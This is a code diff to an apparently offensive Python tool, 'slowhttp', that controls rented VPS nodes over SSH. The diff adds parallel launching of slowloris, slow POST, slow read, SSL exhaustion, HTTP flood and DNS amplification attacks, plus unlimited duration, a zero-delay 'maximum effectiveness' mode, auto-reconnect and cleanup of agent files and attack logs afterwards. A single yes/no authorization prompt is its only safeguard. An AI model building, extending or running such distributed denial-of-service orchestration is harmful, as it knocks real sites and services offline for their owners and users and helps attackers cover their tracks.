@@ -29,6 +29,8 @@ import tempfile
 import platform
 import shutil
 import traceback
+import textwrap
+
 
 # Try to import optional dependencies
 try:
@@ -795,8 +797,25 @@ class SSHManager:
         self.security_manager = security_manager
         self.connection_cache = {}  # Cache VPS credentials for auto-reconnect
         self.cache_lock = threading.Lock()
+
+    def execute_simple_command(self, ip, command, timeout=60):
+        """Execute command with simplified error handling"""
+        if ip not in self.connections:
+            return False, "No connection to VPS"
+        
+        try:
+            stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
+            exit_status = stdout.channel.recv_exit_status()
+            output = stdout.read().decode('utf-8', errors='replace')
+            error = stderr.read().decode('utf-8', errors='replace')
+            
+            return (exit_status == 0), output if exit_status == 0 else error
+            
+        except Exception as e:
+            return False, str(e)
+
     
-    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
+    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=25):
         """Connect to a VPS with comprehensive error handling"""
         if not SSH_AVAILABLE:
             return False, "SSH functionality not available (paramiko not installed)"
@@ -839,7 +858,17 @@ class SSHManager:
         except socket.error as e:
             return False, f"Socket error: {str(e)}"
         except Exception as e:
-            return False, str(e)
+            error_msg = str(e).lower()
+            if "timed out" in error_msg:
+                return False, f"Connection timed out - VPS may be slow or overloaded"
+            elif "refused" in error_msg:
+                return False, f"Connection refused - check if SSH service is running on port {port}"
+            elif "unreachable" in error_msg:
+                return False, f"Network unreachable - check VPS IP address and network"
+            elif "authentication" in error_msg:
+                return False, f"Authentication failed - check username and password"
+            else:
+                return False, f"Connection error: {str(e)}"
     
     def reconnect_vps(self, ip):
         """Attempt to reconnect to VPS using cached credentials"""
@@ -886,6 +915,19 @@ class SSHManager:
                     return False, "No connection to VPS"
             
             try:
+                # Test connection first
+                transport = self.connections[ip].get_transport()
+                if not transport or not transport.is_active():
+                    logger.warning(f"Connection to {ip} is not active, reconnecting...")
+                    if ip in self.connections:
+                        del self.connections[ip]
+                    if auto_reconnect:
+                        success, message = self.reconnect_vps(ip)
+                        if not success:
+                            return False, f"Reconnection failed: {message}"
+                    else:
+                        return False, "Connection not active"
+                
                 stdin, stdout, stderr = self.connections[ip].exec_command(command, timeout=timeout)
                 exit_status = stdout.channel.recv_exit_status()
                 output = stdout.read().decode('utf-8', errors='replace')
@@ -1033,11 +1075,22 @@ class SSHManager:
             return False, "No connection to VPS"
         
         try:
+            # Check if Python3 is available first
+            python_success, python_output = self.execute_command(ip, "python3 --version", timeout=20)
+            if not python_success:
+                return False, f"Python3 not available: {python_output}"
+            
             # Create directory for agent
             mkdir_cmd = "mkdir -p ~/slowhttp_agent"
-            success, output = self.execute_command(ip, mkdir_cmd)
+            success, output = self.execute_command(ip, mkdir_cmd, timeout=25)
             if not success:
                 return False, f"Failed to create agent directory: {output}"
+            
+            # Test write permissions
+            test_cmd = "touch ~/slowhttp_agent/test.txt && rm ~/slowhttp_agent/test.txt"
+            perm_success, perm_output = self.execute_command(ip, test_cmd, timeout=20)
+            if not perm_success:
+                return False, f"No write permissions in agent directory: {perm_output}"
             
             # Get appropriate agent script
             if agent_type == "advanced":
@@ -1070,36 +1123,34 @@ class SSHManager:
             return False, str(e)
     
     def get_system_info(self, ip):
-        """Get system information from VPS"""
         if ip not in self.connections:
             return None
-        
         try:
-            # Create a command to gather system information
-            cmd = """
-            echo "{"
-            echo "  "hostname": "$(hostname)","
-            echo "  "os": "$(cat /etc/os-release | grep PRETTY_NAME | cut -d = -f 2 | tr -d ")","
-            echo "  "kernel": "$(uname -r)","
-            echo "  "cpu": "$(grep model name /proc/cpuinfo | head -1 | cut -d : -f 2 | xargs)","
-            echo "  "cpu_cores": $(grep -c processor /proc/cpuinfo),"
-            echo "  "memory_total": "$(free -h | grep Mem | awk {print $2})","
-            echo "  "memory_used": "$(free -h | grep Mem | awk {print $3})","
-            echo "  "disk_total": "$(df -h / | tail -1 | awk {print $2})","
-            echo "  "disk_used": "$(df -h / | tail -1 | awk {print $3})","
-            echo "  "python_version": "$(python3 --version 2>&1)","
-            echo "  "uptime": "$(uptime -p)""
-            echo "}"
-            """
+            cmd = """bash -c '
+hostname_val=$(hostname)
+os_val=$(cat /etc/os-release | grep PRETTY_NAME | cut -d= -f2 | tr -d '"')
+kernel_val=$(uname -r)
+cpu_val=$(cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2 | sed "s/^ *//")
+cpu_cores_val=$(nproc)
+mem_total_val=$(free -m | awk "/MemTotal:/ {printf "%.0f MiB", \$2/1024}")
+mem_used_val=$(free -m | awk "/Mem:/ {printf "%d MiB", \$3}")
+disk_total_val=$(df -h / | awk "NR==2{print \$2}")
+disk_used_val=$(df -h / | awk "NR==2{print \$3}")
+python_ver_val=$(python3 --version 2>&1 || echo "Not available")
+uptime_val=$(uptime -p)
+
+echo "{"hostname":"$hostname_val","os":"$os_val","kernel":"$kernel_val","cpu":"$cpu_val","cpu_cores":$cpu_cores_val,"memory_total":"$mem_total_val","memory_used":"$mem_used_val","disk_total":"$disk_total_val","disk_used":"$disk_used_val","python_version":"$python_ver_val","uptime":"$uptime_val"}"
+' """
+            # Windows CRLF suka bikin heredoc halu
+            cmd = cmd.replace('\r\n', '\n')
+            if not cmd.endswith('\n'):
+                cmd += '\n'
             
-            success, output = self.execute_command(ip, cmd)
+            success, output = self.execute_command(ip, cmd, timeout=20)
             if not success:
                 return None
-            
-            # Parse JSON output
             try:
-                system_info = json.loads(output)
-                return system_info
+                return json.loads(output.strip())
             except json.JSONDecodeError:
                 logger.error(f"Failed to parse system info from {ip}: {output}")
                 return None
@@ -1108,8 +1159,32 @@ class SSHManager:
             return None
     
     def get_connection_status(self, ip):
-        """Check if connection to VPS is active"""
-        return ip in self.connections
+        """Check if connection to VPS is active and working"""
+        if ip not in self.connections:
+            return False
+        
+        try:
+            transport = self.connections[ip].get_transport()
+            if transport and transport.is_active():
+                return True
+            else:
+                # Remove inactive connection
+                if ip in self.connections:
+                    try:
+                        self.connections[ip].close()
+                    except:
+                        pass
+                    del self.connections[ip]
+                return False
+        except:
+            # Remove broken connection
+            if ip in self.connections:
+                try:
+                    self.connections[ip].close()
+                except:
+                    pass
+                del self.connections[ip]
+            return False
     
     def _get_standard_agent_script(self):
         """Get the standard agent script for slowloris and slow POST attacks"""
@@ -3270,7 +3345,7 @@ class NetworkTools:
             headers = {
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
             }
-            response = requests.get(url, headers=headers, timeout=10)
+            response = requests.get(url, headers=headers, timeout=20)
             
             # Check headers for WAF indicators
             waf_headers = {
@@ -3742,14 +3817,26 @@ class AttackManager:
     def launch_attack(self, session_id, target_url, attack_type, vps_list, parameters):
         """Launch attack with comprehensive error handling and auto-reconnect"""
         
-        # Parse target URL properly
-        if target_url.startswith('http'):
+        # Parse target URL properly with robust handling
+        try:
+            if not target_url.startswith('http'):
+                target_url = 'http://' + target_url
+            
             parsed = urlparse(target_url)
-            target_host = parsed.hostname or parsed.netloc
-            use_ssl = target_url.startswith('https://')
-        else:
-            target_host = target_url.split(':')[0].split('/')[0]
-            use_ssl = False
+            target_host = parsed.hostname or parsed.netloc.split(':')[0]
+            target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+            use_ssl = parsed.scheme == 'https'
+            
+            # Validate target host
+            if not target_host:
+                logger.error(f"Invalid target URL: {target_url}")
+                print(f"{Colors.RED}[ERROR] Invalid target URL{Colors.RESET}")
+                return False
+                
+        except Exception as e:
+            logger.error(f"Error parsing target URL: {str(e)}")
+            print(f"{Colors.RED}[ERROR] Failed to parse target URL: {str(e)}{Colors.RESET}")
+            return False
         
         self.active_attacks[session_id] = {
             'target_host': target_host,
@@ -3766,51 +3853,84 @@ class AttackManager:
         print(f"\n{Colors.YELLOW}[ATTACK] Launching {attack_type} attack on {target_host}{Colors.RESET}")
         print(f"{Colors.CYAN}[CONFIG] VPS nodes: {len(vps_list)} | Connections per VPS: {parameters.get('connections', 100)}{Colors.RESET}")
         
-        success_count = 0
-        failed_vps = []
-        
         # Get all VPS data from database for reconnection
         all_vps_data = {vps['ip_address']: vps for vps in self.db_manager.get_all_vps()}
         
-        for vps_ip in vps_list:
-            print(f"{Colors.CYAN}[LAUNCHING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
+        # Pre-validate and reconnect all VPS in parallel
+        print(f"\n{Colors.YELLOW}[VALIDATING] Checking VPS connections...{Colors.RESET}")
+        valid_vps = []
+        invalid_vps = []
+        
+        def validate_vps(vps_ip):
+            """Validate and reconnect VPS if needed"""
+            if self.ssh_manager.get_connection_status(vps_ip):
+                return vps_ip, True, "Already connected"
             
-            # Check connection status and reconnect if necessary
-            if not self.ssh_manager.get_connection_status(vps_ip):
-                print(f"{Colors.YELLOW}RECONNECTING...{Colors.RESET} ", end="", flush=True)
+            vps_data = all_vps_data.get(vps_ip)
+            if vps_data:
+                success, msg = self.ssh_manager.connect_vps(
+                    vps_data['ip_address'], vps_data['username'], 
+                    vps_data['password'], vps_data['ssh_port']
+                )
+                return vps_ip, success, msg
+            return vps_ip, False, "VPS data not found"
+        
+        # Validate all VPS in parallel using ThreadPoolExecutor
+        with ThreadPoolExecutor(max_workers=min(len(vps_list), 10)) as executor:
+            validation_results = list(executor.map(validate_vps, vps_list))
+        
+        for vps_ip, success, msg in validation_results:
+            if success:
+                valid_vps.append(vps_ip)
+                self.db_manager.update_vps_status(vps_ip, 'online')
+            else:
+                invalid_vps.append(f"{vps_ip}: {msg}")
+        
+        if not valid_vps:
+            print(f"{Colors.RED}[ERROR] No valid VPS connections available{Colors.RESET}")
+            self.db_manager.update_attack_status(session_id, 'failed', json.dumps({"errors": invalid_vps}))
+            return False
+        
+        if invalid_vps:
+            print(f"{Colors.YELLOW}[WARNING] {len(invalid_vps)} VPS unavailable{Colors.RESET}")
+        
+        print(f"{Colors.GREEN}[VALIDATED] {len(valid_vps)} VPS ready for attack{Colors.RESET}\n")
+        
+        # Launch attack on all VPS in parallel
+        success_count = 0
+        failed_vps = []
+        
+        def launch_on_vps(vps_ip):
+            """Launch attack on a single VPS"""
+            try:
+                # Build attack command
+                cmd = self._build_attack_command(target_url, attack_type, parameters)
                 
-                vps_data = all_vps_data.get(vps_ip)
-                if vps_data:
-                    reconnect_success, reconnect_msg = self.ssh_manager.connect_vps(
-                        vps_data['ip_address'], vps_data['username'], vps_data['password'], vps_data['ssh_port']
-                    )
-                    if reconnect_success:
-                        print(f"{Colors.GREEN}CONNECTED{Colors.RESET} ", end="", flush=True)
-                        self.db_manager.update_vps_status(vps_ip, 'online')
-                    else:
-                        print(f"{Colors.RED}CONN_FAILED{Colors.RESET}")
-                        failed_vps.append(f"{vps_ip}: Reconnection failed - {reconnect_msg}")
-                        continue
+                # Execute with longer timeout
+                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
+                
+                if success:
+                    # Start monitoring thread for this VPS
+                    self._start_monitoring_thread(session_id, vps_ip)
+                    return vps_ip, True, "Launched"
                 else:
-                    print(f"{Colors.RED}NO_DATA{Colors.RESET}")
-                    failed_vps.append(f"{vps_ip}: VPS data not found in database")
-                    continue
-            
-            # Build attack command
-            cmd = self._build_attack_command(target_url, attack_type, parameters)
-            
-            # Execute with longer timeout and better error detection
-            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
-            
+                    return vps_ip, False, output
+            except Exception as e:
+                return vps_ip, False, str(e)
+        
+        # Launch on all VPS in parallel
+        print(f"{Colors.CYAN}[LAUNCHING] Starting attack on all VPS simultaneously...{Colors.RESET}\n")
+        with ThreadPoolExecutor(max_workers=min(len(valid_vps), 20)) as executor:
+            launch_results = list(executor.map(launch_on_vps, valid_vps))
+        
+        for vps_ip, success, msg in launch_results:
+            print(f"{Colors.CYAN}[{vps_ip}]{Colors.RESET} ", end="", flush=True)
             if success:
                 print(f"{Colors.GREEN}LAUNCHED{Colors.RESET}")
                 success_count += 1
-                
-                # Start monitoring thread for this VPS
-                self._start_monitoring_thread(session_id, vps_ip)
             else:
-                print(f"{Colors.RED}FAILED{Colors.RESET}")
-                failed_vps.append(f"{vps_ip}: {output}")
+                print(f"{Colors.RED}FAILED - {msg[:50]}{Colors.RESET}")
+                failed_vps.append(f"{vps_ip}: {msg}")
         
         # Update attack status in database
         if success_count > 0:
@@ -3834,28 +3954,43 @@ class AttackManager:
             return False
     
     def _build_attack_command(self, target_url, attack_type, parameters):
-        """Build the attack command to execute on VPS"""
+        """Build the attack command to execute on VPS with proper sanitization"""
+        import shlex
         
-        # Base command with nohup to keep running after SSH disconnects
-        cmd = "cd ~/slowhttp_agent && nohup python3 agent.py "
+        # Sanitize inputs to prevent command injection
+        safe_target = shlex.quote(target_url)
+        safe_attack_type = shlex.quote(attack_type)
         
-        # Add target
-        cmd += f"--target {target_url}"
+        # Check if agent exists first, then build command
+        cmd = "cd ~/slowhttp_agent 2>/dev/null || (echo 'Agent not deployed' >&2 && exit 1) && "
+        cmd += "nohup python3 agent.py "
         
-        # Add attack type
-        cmd += f"--attack-type {attack_type} "
+        # Add target with sanitization
+        cmd += f"--target {safe_target} "
+        
+        # Add attack type with sanitization
+        cmd += f"--attack-type {safe_attack_type} "
         
         # Add common parameters
         connections = parameters.get('connections', 100)
         cmd += f"--connections {connections} "
         
+        # Handle unlimited duration
         duration = parameters.get('duration', 300)
-        cmd += f"--duration {duration} "
+        if duration == 0 or duration == -1:
+            # Unlimited duration - set to very high value
+            cmd += "--duration 999999999 "
+        else:
+            cmd += f"--duration {duration} "
         
         # Add attack-specific parameters
         if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
             delay = parameters.get('delay', 10)
-            cmd += f"--delay {delay} "
+            if delay == 0:
+                # No delay mode for maximum effectiveness
+                cmd += "--delay 0 "
+            else:
+                cmd += f"--delay {delay} "
         
         if attack_type == 'http_flood':
             requests = parameters.get('requests', 1000)
@@ -3864,10 +3999,12 @@ class AttackManager:
         if attack_type == 'dns_amplification':
             target_ip = parameters.get('target_ip')
             if target_ip:
-                cmd += f"--target-ip {target_ip} "
+                safe_target_ip = shlex.quote(target_ip)
+                cmd += f"--target-ip {safe_target_ip} "
         
         # Redirect output to log file and run in background
-        cmd += f"> attack_{attack_type}_{int(time.time())}.log 2>&1 & echo $!"
+        timestamp = int(time.time())
+        cmd += f"> attack_{attack_type}_{timestamp}.log 2>&1 & echo $!"
         
         return cmd
     
@@ -3902,11 +4039,24 @@ class AttackManager:
             try:
                 # Get attack stats from VPS
                 cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep"
-                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                 
                 if not success or not output:
                     # Process not found, attack might have stopped
                     logger.warning(f"Attack process not found on {vps_ip}")
+                    
+                    # Check if connection is still alive
+                    if not self.ssh_manager.get_connection_status(vps_ip):
+                        logger.warning(f"Connection lost to {vps_ip}, attempting reconnect...")
+                        reconnect_success, msg = self.ssh_manager.reconnect_vps(vps_ip)
+                        if not reconnect_success:
+                            logger.error(f"Failed to reconnect to {vps_ip}: {msg}")
+                            # Add result with error
+                            self.db_manager.add_attack_result(
+                                session_id, vps_ip, 0, 0, 0, 1, None, None, None, 'error'
+                            )
+                            time.sleep(interval)
+                            continue
                     
                     # Add result with error
                     self.db_manager.add_attack_result(
@@ -3921,8 +4071,8 @@ class AttackManager:
                     continue
                 
                 # Get CPU and memory usage
-                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk {print $3 " " $4}"
-                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                cmd = "cd ~/slowhttp_agent && ps aux | grep agent.py | grep -v grep | awk '{print $3 &quot; &quot; $4}'"
+                success, resource_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                 
                 cpu_usage = None
                 memory_usage = None
@@ -3938,7 +4088,7 @@ class AttackManager:
                 
                 # Try to get attack stats from log file
                 cmd = "cd ~/slowhttp_agent && cat attack_*.log | grep -a 'Status:' | tail -1"
-                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+                success, stats_output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
                 
                 connections_active = 0
                 packets_sent = 0
@@ -4009,7 +4159,7 @@ class AttackManager:
         )
         
         # Execute with longer timeout
-        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=30)
+        success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=45)
         
         if success:
             logger.info(f"Successfully restarted attack on {vps_ip}")
@@ -4047,18 +4197,20 @@ class AttackManager:
         for vps_ip in attack_info['vps_list']:
             print(f"{Colors.CYAN}[STOPPING] {vps_ip}...{Colors.RESET} ", end="", flush=True)
             
-            # Kill agent.py processes for this specific attack session
-            session_id = attack_info.get('session_id', '')
-            if session_id:
-                cmd = f"pkill -f 'python3 agent.py.*{session_id}'"
-            else:
-                cmd = "pkill -f 'python3 agent.py'"
-            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=10)
+            # Kill agent.py processes and cleanup
+            cmd = "pkill -f 'python3 agent.py' && rm -f ~/slowhttp_agent/attack_*.log"
+            success, output = self.ssh_manager.execute_command(vps_ip, cmd, timeout=20)
             
             if success:
                 print(f"{Colors.GREEN}STOPPED{Colors.RESET}")
             else:
                 print(f"{Colors.YELLOW}FAILED{Colors.RESET}")
+        
+        # Cleanup agent files on all VPS
+        print(f"\n{Colors.YELLOW}[CLEANUP] Removing agent files...{Colors.RESET}")
+        for vps_ip in attack_info['vps_list']:
+            cleanup_cmd = "rm -rf ~/slowhttp_agent"
+            self.ssh_manager.execute_command(vps_ip, cleanup_cmd, timeout=20)
         
         # Update attack status in database
         self.db_manager.update_attack_status(session_id, 'completed')
@@ -4072,7 +4224,7 @@ class AttackManager:
             # Threads will terminate on their own when they check active_attacks
             del self.monitoring_threads[session_id]
         
-        print(f"\n{Colors.GREEN}[SUCCESS] Attack {session_id} stopped{Colors.RESET}")
+        print(f"\n{Colors.GREEN}[SUCCESS] Attack {session_id} stopped and cleaned up{Colors.RESET}")
         return True
     
     def get_attack_status(self, session_id):
@@ -4293,7 +4445,10 @@ class SlowHTTPTUI:
         try:
             # Validate IP address
             def validate_ip(ip):
-                return self.security_manager.validate_ip(ip), "Invalid IP address format"
+                is_valid = self.security_manager.validate_ip(ip)
+                if is_valid:
+                    return True, ""
+                return False, "Invalid IP address format"
                 
             # Validate port number
             def validate_port(port):
@@ -4383,11 +4538,11 @@ class SlowHTTPTUI:
             ip, username, encrypted_password, port = vps['ip_address'], vps['username'], vps['password'], vps['ssh_port']
             print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
             
-            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
+            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=20)
             
             if success:
                 # Test command execution
-                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
+                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=20)
                 if cmd_success:
                     print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                     self.db_manager.update_vps_status(ip, 'online', "Connection and command execution successful")
@@ -4715,19 +4870,23 @@ class SlowHTTPTUI:
             try:
                 connections = int(connections)
                 if connections < 1:
-                    raise ValueError("Connections must be positive")
-            except ValueError:
-                print(f"{Colors.RED}Invalid connections value{Colors.RESET}")
+                    raise ValueError("Connections must be at least 1")
+                if connections > 10000:
+                    raise ValueError("Connections cannot exceed 10000")
+            except ValueError as e:
+                print(f"{Colors.RED}Invalid connections value: {str(e)}{Colors.RESET}")
                 input("Press Enter to continue...")
                 return
             
-            duration = self.terminal.input_with_prompt("Attack duration in seconds [300]: ", False) or "300"
+            duration = self.terminal.input_with_prompt("Attack duration in seconds [300, 0 for unlimited]: ", False) or "300"
             try:
                 duration = int(duration)
-                if duration < 1:
-                    raise ValueError("Duration must be positive")
-            except ValueError:
-                print(f"{Colors.RED}Invalid duration value{Colors.RESET}")
+                if duration < 0:
+                    raise ValueError("Duration must be 0 (unlimited) or positive")
+                if duration > 86400 and duration != 0:
+                    raise ValueError("Duration cannot exceed 24 hours (86400 seconds), use 0 for unlimited")
+            except ValueError as e:
+                print(f"{Colors.RED}Invalid duration value: {str(e)}{Colors.RESET}")
                 input("Press Enter to continue...")
                 return
             
@@ -4738,11 +4897,14 @@ class SlowHTTPTUI:
             }
             
             if attack_type in ['slowloris', 'slow_post', 'slow_read', 'ssl_exhaust']:
-                delay = self.terminal.input_with_prompt("Delay between requests in seconds [10]: ", False) or "10"
+                delay = self.terminal.input_with_prompt("Delay between requests in seconds [10, 0 for no delay]: ", False) or "10"
                 try:
-                    parameters['delay'] = float(delay)
-                except ValueError:
-                    print(f"{Colors.RED}Invalid delay value{Colors.RESET}")
+                    delay_val = float(delay)
+                    if delay_val < 0:
+                        raise ValueError("Delay must be 0 (no delay) or positive")
+                    parameters['delay'] = delay_val
+                except ValueError as e:
+                    print(f"{Colors.RED}Invalid delay value: {str(e)}{Colors.RESET}")
                     input("Press Enter to continue...")
                     return
             
@@ -4770,7 +4932,31 @@ class SlowHTTPTUI:
             print(f"Attack Type: {attack_methods[attack_type]}")
             print(f"VPS Nodes: {len(selected_vps)}")
             print(f"Connections per VPS: {connections}")
-            print(f"Duration: {duration} seconds")
+            if duration == 0:
+                print(f"Duration: UNLIMITED")
+            else:
+                print(f"Duration: {duration} seconds")
+            
+            # Calculate total impact
+            total_connections = connections * len(selected_vps)
+            print(f"\n{Colors.YELLOW}Total Connections: {total_connections}{Colors.RESET}")
+            
+            # Warning for high-intensity attacks
+            if total_connections > 1000 or duration == 0:
+                print(f"\n{Colors.RED}{'='*60}{Colors.RESET}")
+                print(f"{Colors.RED}WARNING: This is a HIGH-INTENSITY attack!{Colors.RESET}")
+                print(f"{Colors.RED}Total connections: {total_connections}{Colors.RESET}")
+                if duration == 0:
+                    print(f"{Colors.RED}Duration: UNLIMITED - Attack will run until manually stopped{Colors.RESET}")
+                print(f"{Colors.RED}Make sure you have authorization to test this target!{Colors.RESET}")
+                print(f"{Colors.RED}{'='*60}{Colors.RESET}")
+                
+                # Double confirmation
+                confirm1 = input(f"\n{Colors.RED}I have authorization to test this target (yes/no): {Colors.RESET}").strip().lower()
+                if confirm1 != 'yes':
+                    print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
+                    input("Press Enter to continue...")
+                    return
             
             confirm = input(f"\n{Colors.RED}Launch attack? (y/N): {Colors.RESET}").strip().lower()
             
